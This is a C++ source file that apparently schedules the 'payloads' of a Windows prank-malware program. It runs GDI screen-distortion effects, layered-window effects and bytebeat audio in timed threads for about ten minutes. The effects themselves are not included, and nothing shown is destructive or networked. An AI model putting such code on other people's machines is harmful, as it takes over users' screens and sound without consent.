#include "include.h"

namespace GDIShaderThreads
{
    VOID GDIShader1()
    {
    	HANDLE GDIThread = CreateThread(0, 0, GDIShaders::GDIShader1, 0, 0, 0);
    	Sleep(20000);
    	TerminateThread(GDIThread, 0);
    }
}

namespace GDILayeredThreads
{
    VOID GDILayered1()
    {
    	HANDLE GDIThread = CreateThread(0, 0, GDILayered::GDILayered1, 0, 0, 0);
    	Sleep(20000);
    	TerminateThread(GDIThread, 0);
    }
}

namespace BytebeatThreads
{
    	VOID Bytebeat1()
    	{
    		CreateThread(0, 0, Bytebeat::Sound1, 0, 0, 0);
    		Sleep(30000);
    	}
}


void (*IsShadersEnabled[])() =
{
	  GDIShaderThreads::GDIShader1
};

void (*IsGDILayeredThreadsEnabled[])() =
{
	  GDILayeredThreads::GDILayered1
};

void (*IsBytebeatThreadsEnabled[])() =
{
	  BytebeatThreads::Bytebeat1
};

VOID InitGDIShaders()
{
	int AllStages = sizeof(IsShadersEnabled) / sizeof(IsShadersEnabled[0]);

	while (IsShadersEnabled && IsShadersEnabled[0])
	{
		int RandomThread = rand() % AllStages;

		IsShadersEnabled[RandomThread]();
	}

	InvalidateRect(0, 0, 1);
}

VOID InitGDILayereds()
{
	int AllStages = sizeof(IsGDILayeredThreadsEnabled) / sizeof(IsGDILayeredThreadsEnabled[0]);

	while (IsGDILayeredThreadsEnabled && IsGDILayeredThreadsEnabled[0])
	{
		int RandomThread = rand() % AllStages;

		IsGDILayeredThreadsEnabled[RandomThread]();
	}

	InvalidateRect(0, 0, 1);
}

VOID InitBytebeats()
{
	int AllStages = sizeof(IsBytebeatThreadsEnabled) / sizeof(IsBytebeatThreadsEnabled[0]);

	while (IsBytebeatThreadsEnabled && IsBytebeatThreadsEnabled[0])
	{
		int RandomThread = rand() % AllStages;

		IsBytebeatThreadsEnabled[RandomThread]();
	}

	InvalidateRect(0, 0, 1);
}

VOID InitPayloads()
{
  	HANDLE ShaderThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)InitGDIShaders, 0, 0, 0);
  	HANDLE LayeredThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)InitGDILayereds, 0, 0, 0);
  	HANDLE BytebeatThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)InitBytebeats, 0, 0, 0);
  	Sleep(600000);
}
